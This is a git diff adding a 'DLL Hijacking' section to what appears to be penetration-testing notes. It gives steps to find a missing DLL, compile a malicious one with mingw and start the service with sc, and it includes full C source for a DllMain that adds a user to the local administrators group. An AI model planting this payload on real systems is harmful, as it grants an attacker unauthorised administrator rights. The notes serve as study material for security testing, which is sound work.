@@ -729,7 +729,35 @@ Management Users can access it with WinRM.
 ### DLL Hijacking
 
 - Open `Process Monitor` and check for a program missing a dll
+- Create a malicious dll with `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme2.dll`
 
+ ![image](https://github.com/user-attachments/assets/84c362fa-f3fa-47ab-9f39-a47c1dedc4a8)
+
+
+- Copy the malicious dll to the location.
+
+![image](https://github.com/user-attachments/assets/0e864d2f-9c76-4609-929a-2fedb9636b86)
+
+- Then,use `sc` to start the service with `sc start <service>`.You can stop a service with `sc stop <service>`.
+
+![image](https://github.com/user-attachments/assets/ee609183-86c9-4828-90db-0871fb1ddedb)
+
+- Malicious code for the dll
+
+```c
+// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k net localgroup administrators user /add");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
 
 -------------------------
 
